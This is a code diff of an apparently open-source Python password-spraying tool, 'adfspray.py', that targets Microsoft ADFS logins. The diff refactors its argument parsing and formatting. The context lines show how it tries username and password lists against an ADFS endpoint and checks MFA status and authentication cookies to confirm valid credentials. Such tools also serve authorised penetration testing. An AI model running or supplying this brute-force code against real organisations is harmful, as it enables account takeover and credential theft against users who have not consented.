@@ -26,13 +26,11 @@ def parse_arguments():
         description="ADFS Brute-Force Login Script",
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="Usage examples:"
-        "\n  python script.py -t https://adfs.example.com -u user -p password123"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 -mfa"
-        "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt -v -o output.txt"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
-        "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
+        "\n  python adfspray.py -t https://adfs.example.com -u user -p password123"
+        "\n  python adfspray.py -t https://adfs.example.com -U userlist.txt -p password123 -mfa"
+        "\n  python adfspray.py -t https://adfs.example.com -u user -P passwordlist.txt -v -o output.txt"
+        "\n  python adfspray.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
     )
-
     parser.add_argument(
         "-t",
         "--target",
@@ -40,24 +38,26 @@ def parse_arguments():
         required=True,
         help="ADFS target host URL (e.g., https://adfs.example.com)",
     )
-    parser.add_argument(
+    users_parser = parser.add_mutually_exclusive_group()
+    users_parser.add_argument(
         "-u", "--username", type=str, required=False, help="Single username to try"
     )
-    parser.add_argument(
+    users_parser.add_argument(
         "-U",
         "--username-list",
         type=str,
         required=False,
         help="File containing a list of usernames",
     )
-    parser.add_argument(
+    passwords_parser = parser.add_mutually_exclusive_group()
+    passwords_parser.add_argument(
         "-p",
         "--password",
         type=str,
         required=False,
         help="Single password to use for login attempts",
     )
-    parser.add_argument(
+    passwords_parser.add_argument(
         "-P",
         "--password-list",
         type=str,
@@ -129,6 +129,7 @@ def check_authentication_cookies(login_srf_response):
     cookies = login_srf_response.cookies
     return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies
 
+
 def handle_ms_login(session, login_response, username, log_file, headers):
     wresult_value = extract_saml_assertion(login_response)
     if wresult_value:
@@ -146,9 +147,8 @@ def handle_ms_login(session, login_response, username, log_file, headers):
         )
         login_srf_response.raise_for_status()
 
-        if (
-            login_srf_response.status_code == 200
-            and check_authentication_cookies(login_srf_response)
+        if login_srf_response.status_code == 200 and check_authentication_cookies(
+            login_srf_response
         ):
             if "BeginAuth" in login_srf_response.text:
                 log_message(
@@ -168,9 +168,8 @@ def handle_ms_login(session, login_response, username, log_file, headers):
                     color=Fore.MAGENTA,
                 )
         else:
-            print(
-                f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
-            )
+            print(f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}")
+
 
 def send_login_request(
     target,
@@ -241,7 +240,9 @@ def send_login_request(
 
             if check_mfa:
                 if microsoft_checks_mfa:
-                    handle_ms_login(session, adfs_login_response, username, log_file, headers)
+                    handle_ms_login(
+                        session, adfs_login_response, username, log_file, headers
+                    )
                 elif adfs_checks_mfa:
                     adfs_mfa_response = session.get(
                         adfs_login_response.headers["Location"],
@@ -258,7 +259,9 @@ def send_login_request(
                                 color=Fore.RED,
                             )
                         elif "MSISAuth" in adfs_mfa_response.cookies:
-                            handle_ms_login(session, adfs_mfa_response, username, log_file, headers)
+                            handle_ms_login(
+                                session, adfs_mfa_response, username, log_file, headers
+                            )
                         else:
                             print(
                                 f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
